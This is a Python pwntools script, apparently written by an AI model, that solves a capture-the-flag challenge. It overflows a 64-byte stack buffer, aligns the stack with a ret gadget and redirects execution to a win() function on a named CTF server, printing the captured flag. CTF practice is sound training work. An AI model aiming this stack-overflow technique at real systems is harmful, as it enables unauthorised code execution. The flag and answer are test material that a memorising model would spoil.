#!/usr/bin/env python3
"""
Author: Claude
Purpose: Exploit buffer overflow in "The Floor is Lava" challenge
Created: 2025-11-15
Updated: 2025-11-15 (Added stack alignment with ret gadget)

Assumptions:
- Target binary has no stack canary, NX disabled, and no PIE
- Buffer is 64 bytes at rbp-0x40
- win() function is at 0x4011f6
- Offset to return address is 72 bytes (64 bytes buffer + 8 bytes saved rbp) - VERIFIED
- Stack must be 16-byte aligned, using ret gadget at 0x40101a

Expected result: Get the flag by redirecting execution to win()
Produced result: SUCCESS! Flag: poctf{uwsp_17_w45n7_3v3n_w0r7h_17}
"""

from pwn import *

# Configuration
HOST = "exp100-4.pointeroverflowctf.com"
PORT = 14668
WIN_ADDR = 0x4011f6
RET_GADGET = 0x40101a  # Simple ret for stack alignment

def exploit_remote():
    """Exploit against remote server"""
    p = remote(HOST, PORT)

    # Build payload with stack alignment
    offset = 72  # 64 bytes buffer + 8 bytes saved rbp
    payload = b'A' * offset
    payload += p64(RET_GADGET)  # Align stack
    payload += p64(WIN_ADDR)    # Call win()

    # Send payload
    p.sendlineafter(b'> ', payload)

    # Get response
    response = p.recvall(timeout=2)

    # Try to decode, handling errors
    try:
        decoded = response.decode('utf-8', errors='ignore')
        print(decoded)
    except:
        print(response)

    # Check if we got the flag
    if b'poctf{' in response or b'FLAG:' in response:
        print("\n[+] Flag obtained!")
        # Extract and save the flag
        for line in response.split(b'\n'):
            if b'FLAG:' in line or b'poctf{' in line:
                print(f"[+] {line.decode('utf-8', errors='ignore')}")

    p.close()

if __name__ == "__main__":
    context.log_level = 'info'
    context.arch = 'amd64'

    print("[*] Exploiting remote server...")
    exploit_remote()
